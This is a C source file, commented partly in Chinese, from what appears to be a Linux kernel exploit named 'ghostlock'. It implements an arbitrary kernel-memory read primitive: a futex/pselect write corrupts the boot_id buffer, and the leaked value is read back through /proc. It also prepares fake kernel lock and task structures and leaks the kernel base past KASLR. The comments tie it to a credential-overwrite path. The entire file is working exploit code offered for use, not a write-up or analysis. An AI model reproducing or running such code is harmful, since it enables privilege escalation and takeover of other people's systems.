/* direct_write.c — direct mode 读写原语
 *
 * 这一族函数实现 ghostlock 的"任意地址读"原语 (shape=0)：通过 PI write
 * 把 boot_id data 的低字节写成读出值，再从 /proc/sys/kernel/random/boot_id
 * 读回。被 selinux.c 的 run_write2_cred 用作 entry_task 读取 fallback。
 *
 * 仅 direct_read_shape0_exact64_once 对外暴露 (非 static)，其余辅助函数
 * 保持文件内 static。 */
#include "unplus.h"

#define DIRECT_WRITE_ATTEMPTS 3

static int direct_read_boot_id_raw(unsigned char raw[16]) {
  char text[64];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("direct boot_id open failed errno=%d\n", errno);
    return 0;
  }

  ssize_t n = read(fd, text, sizeof(text) - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    pr_warning("direct boot_id read failed ret=%zd errno=%d\n",
               n, saved_errno);
    return 0;
  }
  text[n] = 0;

  int high = -1;
  int out = 0;
  for (ssize_t i = 0; i < n && out < 16; i++) {
    int value = hex_value(text[i]);
    if (value < 0) {
      continue;
    }
    if (high < 0) {
      high = value;
    } else {
      raw[out++] = (unsigned char)((high << 4) | value);
      high = -1;
    }
  }
  if (out != 16) {
    pr_warning("direct boot_id parse failed bytes=%d ret=%zd\n", out, n);
    return 0;
  }
  return 1;
}

static int direct_pin_verify_cpu(
    const char *phase, const char *name, int attempt, int idx, int *cpu_out) {
  /* Try to pin to the preferred core with retries */
  for (int retry = 0; retry < 100; retry++) {
    pin_to_core((size_t)direct_root_cpu);
    for (int y = 0; y < 10; y++) {
      sched_yield();
    }
    errno = 0;
    int cpu = sched_getcpu();
    int saved_errno = errno;
    if (cpu == direct_root_cpu) {
      if (cpu_out) *cpu_out = cpu;
      return 1;
    }
    if (retry == 0) {
      pr_error("direct-r64-retry name=%s phase=%s attempt=%d idx=%d "
               "reason=cpu-mismatch-pinning expected_cpu=%u observed_cpu=%d "
               "retry=%d pid=%d tid=%ld\n",
               name, phase, attempt, idx, direct_root_cpu, cpu,
               retry, getpid(), syscall(SYS_gettid));
    }
    /* Fallback: try a different CPU if the preferred one is unavailable */
    if (retry >= 50) {
      for (int alt = direct_root_cpu - 1; alt >= 0; alt--) {
        pin_to_core((size_t)alt);
        for (int y = 0; y < 10; y++) sched_yield();
        cpu = sched_getcpu();
        if (cpu == alt) {
          direct_root_cpu = alt;
          if (cpu_out) *cpu_out = alt;
          pr_success("direct-cpu-fallback new_direct_root_cpu=%d\n", alt);
          return 1;
        }
      }
    }
  }
  errno = 0;
  int cpu = sched_getcpu();
  if (cpu_out) *cpu_out = cpu;
  pr_error("direct-r64-fatal name=%s phase=%s attempt=%d idx=%d "
           "reason=cpu-mismatch expected_cpu=%u observed_cpu=%d "
           "pid=%d tid=%ld\n",
           name, phase, attempt, idx, direct_root_cpu, cpu, errno,
           getpid(), syscall(SYS_gettid));
  return 0;
}

static int direct_trigger_inline(uintptr_t target, uintptr_t value,
                                 int shape, int idx) {
  if (!page_base || !fake_lock || !fake_w0 || !fake_task) {
    pr_warning("direct-inline[%d] no saved page\n", idx);
    return 0;
  }

  /* Use the slide pipeline (slide_child_leak_stext) which is proven
   * to work on this UBSAN kernel, instead of run_main_route_threads. */
  set_pselect_write(target, value, shape);

  /* Reset slide futex state polluted by first call. */
  reset_slide_futex_state();

  /* Full page re-initialization — same as first slide does.
   * Simple prepare_skb_payload is not enough. */
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
  if (!page_base || !fake_lock || !fake_w0 || !fake_task) {
    pr_warning("direct-inline[%d] page re-init failed\n", idx);
    return 0;
  }

  /* Set up pipe — remap fds above PSELECT_ROUTE_NFDS (320)
   * to avoid collision with pselect fd_set, same as slide_leak_kernel_base. */
  int raw_fds[2];
  if (pipe(raw_fds) != 0) {
    return 0;
  }
  int fds[2];
  fds[0] = fcntl(raw_fds[0], F_DUPFD, PSELECT_ROUTE_NFDS + 128);
  fds[1] = fcntl(raw_fds[1], F_DUPFD, PSELECT_ROUTE_NFDS + 129);
  close(raw_fds[0]);
  close(raw_fds[1]);

  pid_t child = fork();
  if (child < 0) {
    close(fds[0]); close(fds[1]);
    return 0;
  }

  if (child == 0) {
    close(fds[0]);
    uint64_t leaked = slide_child_leak_stext();
    if (leaked) {
      write(fds[1], &leaked, sizeof(leaked));
      _exit(0);
    }
    _exit(1);
  }

  close(fds[1]);
  uint64_t leaked = 0;
  ssize_t n = read(fds[0], &leaked, sizeof(leaked));
  close(fds[0]);
  int status = 0;
  waitpid(child, &status, 0);

  pr_success("direct-inline[%d] target=%016zx value=%016zx shape=%d "
             "workspace=%016zx leaked=%016llx n=%zd\n",
             idx, target, value, shape, page_base,
             (unsigned long long)leaked, n);

  return (n == sizeof(leaked) && WIFEXITED(status) &&
          WEXITSTATUS(status) == 0 && leaked != 0);
}

int direct_read_shape0_exact64_once(
    uintptr_t q, uint64_t *value, const char *name,
    int attempt, int *write_idx) {
  const uintptr_t b = SLIDE_RANDOM_BOOT_ID_DATA;

  /*
   * Q1 是 KASLR 后的 image/data 地址，Q2 才是 direct-map 地址；因此这里
   * 只要求 Q 为内核指针，具体地址域由两个调用者分别收紧。
   */
  if (!value || !write_idx || !is_direct_ptr(b) || !is_kernel_ptr(q) ||
      (b & 7) != 0 || (q & 7) != 0 || q > UINTPTR_MAX - 16) {
    pr_error("direct-r64-fatal name=%s phase=precheck attempt=%d "
             "reason=bad-address B=%016zx Q=%016zx Q8=%016zx Q16=%016zx\n",
             name, attempt, b, q, q + 8, q + 16);
    return DIRECT_R64_FATAL;
  }

  int idx = (*write_idx)++;
  int cpu_before = -1;
  int cpu_after_trigger = -1;
  int cpu_after_read = -1;
  if (!direct_pin_verify_cpu(
          "before-shape0", name, attempt, idx, &cpu_before)) {
    return DIRECT_R64_FATAL;
  }

  pr_success("direct-r64-plan name=%s attempt=%d/%d idx=%d shape=0 "
             "cpu=%d pid=%d tid=%ld B=%016zx Q=%016zx Q8=%016zx Q16=%016zx\n",
             name, attempt, DIRECT_WRITE_ATTEMPTS, idx, cpu_before,
             getpid(), syscall(SYS_gettid), b, q, q + 8, q + 16);

  if (!direct_trigger_inline(b, q, 0, idx)) {
    pr_warning("direct-r64-retry name=%s attempt=%d idx=%d "
               "reason=primitive-miss B=%016zx Q=%016zx\n",
               name, attempt, idx, b, q);
    return DIRECT_R64_RETRY;
  }

  /* 子进程退出后，父线程必须先回到 CPU7，才能读取 CPU7 的 __entry_task。 */
  if (!direct_pin_verify_cpu(
          "after-shape0", name, attempt, idx, &cpu_after_trigger)) {
    return DIRECT_R64_FATAL;
  }

  unsigned char raw[16] = {0};
  if (!direct_read_boot_id_raw(raw)) {
    pr_error("direct-r64-fatal name=%s phase=proc-read attempt=%d idx=%d "
             "reason=read-or-parse-failed triggered=1 B=%016zx Q=%016zx\n",
             name, attempt, idx, b, q);
    return DIRECT_R64_FATAL;
  }

  if (!direct_pin_verify_cpu(
          "after-proc-read", name, attempt, idx, &cpu_after_read)) {
    return DIRECT_R64_FATAL;
  }

  uint64_t got = 0;
  uint64_t sidecar = 0;
  memcpy(&got, raw, sizeof(got));
  memcpy(&sidecar, raw + 8, sizeof(sidecar));
  unsigned int expected_raw8 = (unsigned int)(b & 0xff);
  int oracle_ok = sidecar == (uint64_t)b && raw[8] == expected_raw8;

  pr_success("direct-r64-oracle name=%s attempt=%d idx=%d shape=0 "
             "cpu_before=%d cpu_after_trigger=%d cpu_after_read=%d "
             "value=%016llx sidecar=%016llx expected_sidecar=%016zx "
             "raw8=%02x expected_raw8=%02x ok=%d\n",
             name, attempt, idx, cpu_before, cpu_after_trigger, cpu_after_read,
             (unsigned long long)got, (unsigned long long)sidecar, b,
             (unsigned int)raw[8], expected_raw8, oracle_ok);
  if (!oracle_ok) {
    pr_error("direct-r64-fatal name=%s phase=oracle attempt=%d idx=%d "
             "reason=shape0-poststate-mismatch triggered=1\n",
             name, attempt, idx);
    return DIRECT_R64_FATAL;
  }

  *value = got;
  return DIRECT_R64_OK;
}
